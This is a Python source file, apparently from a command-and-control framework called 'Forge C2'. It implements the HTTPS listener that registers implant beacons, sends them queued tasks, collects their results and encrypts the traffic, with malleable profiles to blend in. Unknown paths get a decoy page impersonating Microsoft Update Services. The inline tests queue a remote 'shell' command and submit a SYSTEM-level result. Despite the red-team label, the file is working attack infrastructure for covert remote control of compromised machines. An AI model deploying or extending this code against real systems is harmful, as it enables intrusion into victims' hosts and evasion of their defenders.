"""
Forge C2 — HTTP Listener
============================
Refactored HTTP/HTTPS listener — extracted from server.py inline handlers
into a proper listener module backed by the HTTPTransport.

This listener is the main entry point for HTTP/S beacon traffic.
It ties together:
    • HTTPTransport (server mode) — handles connections
    • BeaconRegistry — registers/tracks beacons
    • BeaconCrypto — encrypts/decrypts session traffic
    • MalleableProfile — shapes traffic to blend in

Architecture:
    ┌───────────────┐
    │  HTTP Beacon  │──── POST /api/v1/register ────►┌──────────────────┐
    │  (implant)    │──── POST /api/v1/check ───────►│  HTTPListener    │
    │               │──── POST /api/v1/result ──────►│  (this file)     │
    │               │◄─── tasks / session key ───────│                  │
    └───────────────┘                                 ├──────────────────┤
                                                      │ HTTPTransport    │
                                                      │ BeaconRegistry   │
                                                      │ BeaconCrypto     │
                                                      │ MalleableProfile │
                                                      └──────────────────┘

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import json
import logging
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Coroutine

from forge_c2.beacon.beacon_core import Beacon, BeaconRegistry
from forge_c2.beacon.beacon_crypto import BeaconCrypto
from forge_c2.transport.base_transport import MalleableProfile, get_profile
from forge_c2.transport.http_transport import HTTPTransport

log = logging.getLogger("forge.c2.listener.http")


@dataclass
class HTTPListenerConfig:
    """Configuration for the HTTP listener."""
    bind_host:    str = "0.0.0.0"
    bind_port:    int = 443
    use_ssl:      bool = True
    cert_file:    str = ""
    key_file:     str = ""
    profile_name: str = "default"

    # C2 protocol paths (must match what the implant/beacon uses)
    register_path: str = "/api/v1/register"
    checkin_path:   str = "/api/v1/check"
    result_path:    str = "/api/v1/result"

    # Rate limiting
    max_connections_per_minute: int = 120
    max_body_size:             int = 10 * 1024 * 1024  # 10MB


class HTTPListener:
    """HTTP/HTTPS beacon listener.

    Accepts beacon connections, handles registration/check-in/result
    protocol, and delegates to the BeaconRegistry + BeaconCrypto.

    Replaces the inline _run_http_listener() from server.py with
    a proper modular listener that uses the transport layer.

    Usage::

        listener = HTTPListener(
            config=HTTPListenerConfig(bind_port=8443),
            registry=beacon_registry,
            crypto=beacon_crypto,
        )
        await listener.start()
        # ... runs forever until stopped
        await listener.stop()
    """

    def __init__(
        self,
        config: HTTPListenerConfig | None = None,
        registry: BeaconRegistry | None = None,
        crypto: BeaconCrypto | None = None,
        event_bus: Any = None,
        on_beacon_registered: Callable[[Beacon], None] | None = None,
        on_beacon_checkin: Callable[[Beacon], None] | None = None,
    ) -> None:
        self.config = config or HTTPListenerConfig()
        self.registry = registry or BeaconRegistry()
        self.crypto = crypto or BeaconCrypto()
        self.event_bus = event_bus
        self.on_beacon_registered = on_beacon_registered
        self.on_beacon_checkin = on_beacon_checkin

        self.profile = get_profile(self.config.profile_name)

        # Transport layer (server mode)
        self._transport = HTTPTransport(
            profile=self.profile,
            role="server",
            use_ssl=self.config.use_ssl,
        )
        # Wire our request handler into the transport
        self._transport._request_handler = self._handle_request

        # Stats
        self._started_at: float = 0.0
        self._running: bool = False
        self._task: asyncio.Task | None = None

        # Request tracking (for rate limiting)
        self._request_times: list[float] = []

    async def start(self) -> None:
        """Start the HTTP listener."""
        self._running = True
        self._started_at = time.time()

        connected = await self._transport.connect(
            self.config.bind_host,
            self.config.bind_port,
            cert_file=self.config.cert_file,
            key_file=self.config.key_file,
        )

        if not connected:
            log.error("HTTPListener failed to start on %s:%d",
                      self.config.bind_host, self.config.bind_port)
            return

        log.info("═══ HTTP LISTENER ONLINE ═══")
        log.info("Bind: %s:%d (SSL=%s, Profile=%s)",
                 self.config.bind_host, self.config.bind_port,
                 self.config.use_ssl, self.config.profile_name)

        self._emit("c2_listener_start",
                    host=self.config.bind_host,
                    port=self.config.bind_port,
                    transport="https" if self.config.use_ssl else "http")

        self._task = asyncio.create_task(
            self._transport.serve_forever(),
            name="http_listener",
        )

    async def stop(self) -> None:
        """Stop the HTTP listener."""
        self._running = False
        await self._transport.disconnect()
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        self._emit("c2_listener_stop")
        log.info("HTTP listener stopped")

    # ── Request routing ───────────────────────────────────────────────

    async def _handle_request(
        self,
        method: str,
        path: str,
        headers: dict[str, str],
        body: bytes,
    ) -> bytes:
        """Route incoming HTTP request to the appropriate handler.

        This is called by HTTPTransport._handle_client_connection()
        for every incoming connection.
        """
        # Rate limit check
        now = time.time()
        self._request_times = [t for t in self._request_times if now - t < 60]
        if len(self._request_times) > self.config.max_connections_per_minute:
            log.warning("Rate limit exceeded — dropping request")
            return self._error_response("rate_limited")
        self._request_times.append(now)

        # Body size check
        if len(body) > self.config.max_body_size:
            log.warning("Body too large: %d bytes", len(body))
            return self._error_response("body_too_large")

        # Route by path
        if method == "POST" and self._match_path(path, self.config.register_path):
            return self._handle_register(body, headers)

        elif method == "POST" and self._match_path(path, self.config.checkin_path):
            return self._handle_checkin(body, headers)

        elif method == "POST" and self._match_path(path, self.config.result_path):
            return self._handle_result(body, headers)

        else:
            # Serve decoy page for anything else
            return self._decoy_response()

    def _match_path(self, request_path: str, config_path: str) -> bool:
        """Match request path against config path.

        Also checks malleable profile URIs for flexibility.
        """
        if request_path == config_path:
            return True

        # Check profile URI rotations
        if config_path == self.config.register_path:
            return request_path in self.profile.register_uris
        elif config_path == self.config.checkin_path:
            return request_path in self.profile.get_uris
        elif config_path == self.config.result_path:
            return request_path in self.profile.post_uris

        return False

    # ── Protocol handlers (extracted from server.py) ──────────────────

    def _handle_register(self, body: bytes, headers: dict[str, str]) -> bytes:
        """Handle new beacon registration.

        Parses system metadata, registers with BeaconRegistry,
        creates crypto session, returns session init data.
        """
        try:
            # Unwrap profile body transforms
            body = self.profile.unwrap_body(body) if body else body
            metadata = json.loads(body) if body else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            metadata = {}

        transport_type = "https" if self.config.use_ssl else "http"
        beacon = self.registry.register(
            metadata=metadata,
            transport=transport_type,
        )

        log.info("BEACON REGISTERED: %s via %s (hostname=%s, user=%s)",
                 beacon.beacon_id, transport_type,
                 beacon.metadata.hostname, beacon.metadata.username)

        # Fire callback
        if self.on_beacon_registered:
            try:
                self.on_beacon_registered(beacon)
            except Exception:
                pass

        # Emit event
        self._emit("c2_beacon_new",
                    beacon_id=beacon.beacon_id,
                    hostname=beacon.metadata.hostname,
                    username=beacon.metadata.username,
                    transport=transport_type)

        # Build response with session init data
        response = {
            "beacon_id": beacon.beacon_id,
            "sleep": beacon.sleep_seconds,
            "jitter": beacon.jitter_pct,
        }

        response_bytes = json.dumps(response).encode()
        return self.profile.wrap_body(response_bytes)

    def _handle_checkin(self, body: bytes, headers: dict[str, str]) -> bytes:
        """Handle beacon check-in — return pending tasks."""
        try:
            body = self.profile.unwrap_body(body) if body else body
            data = json.loads(body) if body else {}
            beacon_id = data.get("beacon_id", "")
        except (json.JSONDecodeError, UnicodeDecodeError):
            beacon_id = ""
            data = {}

        beacon = self.registry.get(beacon_id)
        if not beacon:
            return self._error_response("unknown_beacon")

        # Process check-in — returns pending tasks
        pending_tasks = beacon.checkin()

        # Fire callback
        if self.on_beacon_checkin:
            try:
                self.on_beacon_checkin(beacon)
            except Exception:
                pass

        # Check crypto key rotation
        session = self.crypto.get_session(beacon_id)
        if session and session.needs_rotation():
            self.crypto.rotate_session(beacon_id)
            log.info("Session keys rotated for beacon %s", beacon_id)

        # Build response
        response = {
            "beacon_id": beacon_id,
            "tasks": [t.to_dict() for t in pending_tasks],
            "sleep": beacon.sleep_seconds,
            "jitter": beacon.jitter_pct,
        }

        # Encrypt if session exists
        if session:
            encrypted = self.crypto.encrypt_json(session, response)
            return self.profile.wrap_body(encrypted)

        response_bytes = json.dumps(response).encode()
        return self.profile.wrap_body(response_bytes)

    def _handle_result(self, body: bytes, headers: dict[str, str]) -> bytes:
        """Handle task result submission from a beacon."""
        try:
            body = self.profile.unwrap_body(body) if body else body
            data = json.loads(body) if body else {}
        except (json.JSONDecodeError, UnicodeDecodeError):
            return self._error_response("parse_error")

        beacon_id = data.get("beacon_id", "")
        task_id = data.get("task_id", "")
        result = data.get("result", "")
        success = data.get("success", True)

        beacon = self.registry.get(beacon_id)
        if not beacon:
            return self._error_response("unknown_beacon")

        beacon.complete_task(task_id, result=result, success=success)

        self._emit("c2_task_complete",
                    beacon_id=beacon_id,
                    task_id=task_id,
                    success=success)

        log.info("TASK RESULT: beacon=%s task=%s success=%s",
                 beacon_id, task_id, success)

        return json.dumps({"status": "ok"}).encode()

    # ── Helpers ───────────────────────────────────────────────────────

    @staticmethod
    def _error_response(error: str) -> bytes:
        return json.dumps({"error": error}).encode()

    @staticmethod
    def _decoy_response() -> bytes:
        """Return a legitimate-looking response."""
        return b"""<!DOCTYPE html><html><head><title>Welcome</title></head>
<body><h1>Welcome to Microsoft Update Services</h1>
<p>This server provides update services for authorized clients.</p>
<p>&copy; Microsoft Corporation. All rights reserved.</p>
</body></html>"""

    def _emit(self, event_type: str, **data: Any) -> None:
        """Emit event to dashboard EventBus."""
        if not self.event_bus:
            return
        try:
            from common.dashboard.event_bus import Event, EventType
            self.event_bus.emit(Event(
                event_type=EventType(event_type),
                data=data,
                source="c2_listener",
            ))
        except Exception:
            pass

    def summary(self) -> dict[str, Any]:
        uptime = time.time() - self._started_at if self._started_at else 0
        return {
            "type": "https" if self.config.use_ssl else "http",
            "bind": f"{self.config.bind_host}:{self.config.bind_port}",
            "profile": self.config.profile_name,
            "running": self._running,
            "uptime_seconds": round(uptime, 1),
            "transport_stats": self._transport.stats.to_dict(),
        }


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestHTTPListener:
    """Tests for HTTP listener."""

    def test_init(self) -> None:
        listener = HTTPListener()
        assert listener.config.bind_port == 443
        assert listener.config.use_ssl is True

    def test_config(self) -> None:
        cfg = HTTPListenerConfig(bind_port=8443, use_ssl=False, profile_name="amazon")
        listener = HTTPListener(config=cfg)
        assert listener.config.bind_port == 8443
        assert listener.profile.name == "amazon"

    def test_handle_register(self) -> None:
        listener = HTTPListener()
        body = json.dumps({"hostname": "DC01", "username": "admin"}).encode()
        response = listener._handle_register(body, {})
        data = json.loads(listener.profile.unwrap_body(response))
        assert "beacon_id" in data
        assert data["sleep"] > 0

    def test_handle_checkin_unknown(self) -> None:
        listener = HTTPListener()
        body = json.dumps({"beacon_id": "nonexistent"}).encode()
        response = listener._handle_checkin(body, {})
        data = json.loads(response)
        assert "error" in data

    def test_handle_result(self) -> None:
        listener = HTTPListener()
        # Register a beacon first
        reg_body = json.dumps({"hostname": "WS01"}).encode()
        reg_response = listener._handle_register(reg_body, {})
        reg_data = json.loads(listener.profile.unwrap_body(reg_response))
        beacon_id = reg_data["beacon_id"]

        # Queue a task
        beacon = listener.registry.get(beacon_id)
        beacon.checkin()
        task = beacon.queue_task("shell", cmd="whoami")

        # Submit result
        result_body = json.dumps({
            "beacon_id": beacon_id,
            "task_id": task.task_id,
            "result": "NT AUTHORITY\\SYSTEM",
            "success": True,
        }).encode()
        response = listener._handle_result(result_body, {})
        data = json.loads(response)
        assert data["status"] == "ok"

    def test_match_path(self) -> None:
        listener = HTTPListener()
        assert listener._match_path("/api/v1/register", listener.config.register_path)
        assert listener._match_path("/api/v1/check", listener.config.checkin_path)
        # Profile URIs should also match
        assert listener._match_path("/updates/check", listener.config.checkin_path)

    def test_error_response(self) -> None:
        resp = HTTPListener._error_response("test_error")
        data = json.loads(resp)
        assert data["error"] == "test_error"

    def test_summary(self) -> None:
        listener = HTTPListener()
        s = listener.summary()
        assert "type" in s
        assert "bind" in s
